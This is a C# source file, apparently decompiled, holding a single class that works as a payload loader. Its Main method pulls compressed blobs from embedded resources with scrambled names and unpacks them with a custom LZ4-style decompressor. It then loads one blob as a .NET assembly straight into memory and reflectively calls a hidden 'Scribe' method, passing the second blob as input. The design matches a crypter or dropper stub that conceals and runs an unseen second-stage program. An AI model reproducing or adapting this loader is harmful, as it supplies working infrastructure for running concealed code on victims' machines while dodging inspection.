using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;

internal class Sheeit
{
	private const int STEPSIZE = 4;

	private const uint MASK = 15u;

	private static List<Thread> Threads = new List<Thread>();

	private static Random R = new Random();

	private static readonly sbyte[] m_DecArray = new sbyte[8] { 0, 3, 2, 3, 0, 0, 0, 0 };

	private static void Main()
	{
		Invoke("Scribe", new object[6]
		{
			Dew("Ixkb.pryor.resources"),
			true,
			"",
			true,
			0,
			R
		});
		foreach (Thread thread in Threads)
		{
			thread.Join();
		}
	}

	private static void Invoke(string name, object[] values)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Invoker(name, values);
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		Threads.Add(thread);
	}

	private static object Invoker(string name, object[] values)
	{
		Assembly assembly = AppDomain.CurrentDomain.Load(Dew("Qtqur.pryor.resources"));
		MethodInfo[] methods = assembly.GetType("Ax")!.GetMethods();
		int i;
		for (i = 0; methods[i].Name != name; i++)
		{
		}
		return methods[i].Invoke(null, values);
	}

	private static byte[] Dew(string name)
	{
		ResourceManager resourceManager = new ResourceManager(name.Replace(".resources", ""), Assembly.GetExecutingAssembly());
		UnmanagedMemoryStream stream = resourceManager.GetStream("img");
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		return Decompress(array);
	}

	private static byte[] Decompress(byte[] compressed)
	{
		int num = compressed.Length;
		byte[] array;
		int num2;
		do
		{
			num *= 4;
			array = new byte[num];
			num2 = Decompress(compressed, array, compressed.Length);
		}
		while (num2 < 0 || array.Length < num2);
		byte[] array2 = new byte[num2];
		Buffer.BlockCopy(array, 0, array2, 0, array2.Length);
		return array2;
	}

	private unsafe static int Decompress(byte[] compressedBuffer, byte[] decompressedBuffer, int compressedSize)
	{
		fixed (byte* compressedBuffer2 = compressedBuffer)
		{
			fixed (byte* decompressedBuffer2 = decompressedBuffer)
			{
				return Decompress(compressedBuffer2, decompressedBuffer2, compressedSize, decompressedBuffer.Length);
			}
		}
	}

	private unsafe static int Decompress(byte* compressedBuffer, byte* decompressedBuffer, int compressedSize, int maxDecompressedSize)
	{
		fixed (sbyte* ptr7 = m_DecArray)
		{
			byte* ptr = compressedBuffer;
			byte* ptr2 = ptr + compressedSize;
			byte* ptr3 = decompressedBuffer;
			byte* ptr4 = ptr3 + maxDecompressedSize;
			while (true)
			{
				if (ptr < ptr2)
				{
					byte b = *(ptr++);
					int num;
					if ((num = b >> 4) == 15L)
					{
						int num2 = 255;
						while (ptr < ptr2 && num2 == 255)
						{
							num2 = *(ptr++);
							num += num2;
						}
					}
					byte* ptr5 = ptr3 + num;
					if (ptr5 <= ptr4 - 8 && ptr + num <= ptr2 - 8)
					{
						do
						{
							*(int*)ptr3 = *(int*)ptr;
							ptr3 += 4;
							ptr += 4;
							*(int*)ptr3 = *(int*)ptr;
							ptr3 += 4;
							ptr += 4;
						}
						while (ptr3 < ptr5);
						ptr -= ptr3 - ptr5;
						ptr3 = ptr5;
						byte* ptr6 = ptr5 - (int)(*(ushort*)ptr);
						ptr += 2;
						if (ptr6 < decompressedBuffer)
						{
							break;
						}
						if ((num = b & 0xF) == 15L)
						{
							while (ptr < ptr2)
							{
								int num2 = *(ptr++);
								num += num2;
								if (num2 != 255)
								{
									break;
								}
							}
						}
						if (ptr3 - ptr6 < 4L)
						{
							*(ptr3++) = *(ptr6++);
							*(ptr3++) = *(ptr6++);
							*(ptr3++) = *(ptr6++);
							*(ptr3++) = *(ptr6++);
							ptr6 -= ptr7[ptr3 - ptr6];
							*(int*)ptr3 = *(int*)ptr6;
							ptr3 = ptr3;
							ptr6 = ptr6;
						}
						else
						{
							*(int*)ptr3 = *(int*)ptr6;
							ptr3 += 4;
							ptr6 += 4;
						}
						ptr5 = ptr3 + num;
						if (ptr5 > ptr4 - 8)
						{
							if (ptr5 > ptr4)
							{
								break;
							}
							do
							{
								*(int*)ptr3 = *(int*)ptr6;
								ptr3 += 4;
								ptr6 += 4;
								*(int*)ptr3 = *(int*)ptr6;
								ptr3 += 4;
								ptr6 += 4;
							}
							while (ptr3 < ptr4 - 8);
							while (ptr3 < ptr5)
							{
								*(ptr3++) = *(ptr6++);
							}
							ptr3 = ptr5;
							if (ptr3 == ptr4)
							{
								break;
							}
						}
						else
						{
							do
							{
								*(int*)ptr3 = *(int*)ptr6;
								ptr3 += 4;
								ptr6 += 4;
								*(int*)ptr3 = *(int*)ptr6;
								ptr3 += 4;
								ptr6 += 4;
							}
							while (ptr3 < ptr5);
							ptr3 = ptr5;
						}
						continue;
					}
					if (ptr5 > ptr4 || ptr + num > ptr2)
					{
						break;
					}
					CopyMemory(ptr3, ptr, num);
					ptr3 += num;
					ptr += num;
					if (ptr < ptr2)
					{
						break;
					}
				}
				return (int)(ptr3 - decompressedBuffer);
			}
			return (int)(-(ptr - compressedBuffer));
		}
	}

	private unsafe static void CopyMemory(byte* dst, byte* src, long length)
	{
		while (length >= 16L)
		{
			*(long*)dst = *(long*)src;
			dst += 8;
			src += 8;
			*(long*)dst = *(long*)src;
			dst += 8;
			src += 8;
			length -= 16L;
		}
		if (length >= 8L)
		{
			*(long*)dst = *(long*)src;
			dst += 8;
			src += 8;
			length -= 8L;
		}
		if (length >= 4L)
		{
			*(int*)dst = *(int*)src;
			dst += 4;
			src += 4;
			length -= 4L;
		}
		if (length >= 2L)
		{
			*(short*)dst = *(short*)src;
			dst += 2;
			src += 2;
			length -= 2L;
		}
		if (length != 0L)
		{
			*dst = *src;
		}
	}
}
